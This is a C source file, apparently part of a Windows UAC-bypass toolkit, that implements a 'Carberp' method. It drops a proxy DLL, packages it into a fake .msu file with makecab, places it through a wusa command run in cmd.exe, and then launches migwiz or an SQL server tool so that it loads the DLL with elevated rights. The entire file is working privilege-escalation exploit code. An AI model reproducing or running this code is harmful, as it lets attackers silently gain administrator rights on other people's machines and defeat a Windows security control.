/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       CARBERP.C
*
*  VERSION:     1.30
*
*  DATE:        30 Mar 2015
*
*  Tweaked Carberp methods.
*  Original Carberp is exploiting mcx2prov.exe in ehome.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmWusaMethod
*
* Purpose:
*
* Build and install fake msu packet then run migwiz.
*
*/
BOOL ucmWusaMethod(
	DWORD dwType,
	PVOID ProxyDll,
	DWORD ProxyDllSize
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	LPWSTR lpSourceDll, lpMsuPackage, lpCommandLine, lpTargetProcess;
	WCHAR szDllFileName[MAX_PATH + 1];
	WCHAR szMsuFileName[MAX_PATH + 1];
	WCHAR szCmd[MAX_PATH * 4];

	RtlSecureZeroMemory(szDllFileName, sizeof(szDllFileName));
	RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));

	switch (dwType) {

	case METHOD_CARBERP:
		lpSourceDll = METHOD_MIGWIZ_SOURCEDLL;
		lpMsuPackage = METHOD_CARBERP_MSUPACKAGE;
		lpCommandLine = METHOD_MIGWIZ_CMDLINE;
		lpTargetProcess = METHOD_MIGWIZ_TARGETAPP;
		break;

	case METHOD_CARBERP_EX:
		lpSourceDll = METHOD_SQLSVR_SOURCEDLL;
		lpMsuPackage = METHOD_CARBERP_MSUPACKAGE;
		lpCommandLine = METHOD_SQLSVR_CMDLINE;
		lpTargetProcess = METHOD_SQLSVR_TARGETAPP;
		break;

	default:
		return FALSE;
	}

	do {

		if (ExpandEnvironmentStringsW(lpSourceDll,
			szDllFileName, MAX_PATH) == 0)
		{
			break;
		}

		if (ExpandEnvironmentStringsW(lpMsuPackage,
			szMsuFileName, MAX_PATH) == 0)
		{
			break;
		}

		//drop proxy dll
		if (!supWriteBufferToFile(szDllFileName, ProxyDll, ProxyDllSize)) {
			OutputDebugString(TEXT("[UCM] Failed to drop proxy dll"));
			break;
		}

		//create cab with msu extension
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		wsprintfW(szCmd, L" /V1 %ws %ws", szDllFileName, szMsuFileName);
		if (!supRunProcess(L"makecab.exe", szCmd)) {
			OutputDebugString(TEXT("[UCM] Makecab failed"));
			break;
		}

		//
		// Target is migwiz because it has manifest with access = HighestAvailable and 
		// it is vulnerable to delay load dll attack.
		//
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		wsprintfW(szCmd, lpCommandLine, szMsuFileName);
		if (!supRunProcess(L"cmd.exe", szCmd)) {
			OutputDebugString(TEXT("[UCM] Wusa failed"));
			break;
		}

		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		if (ExpandEnvironmentStringsW(lpTargetProcess,
			szCmd, MAX_PATH) == 0)
		{
			break;
		}
		bResult = supRunProcess(szCmd, NULL);

	} while (cond);

	//cleanup
	if (szDllFileName[0] != 0) {
		DeleteFileW(szDllFileName);
	}
	if (szMsuFileName[0] != 0) {
		DeleteFileW(szMsuFileName);
	}

	return bResult;
}
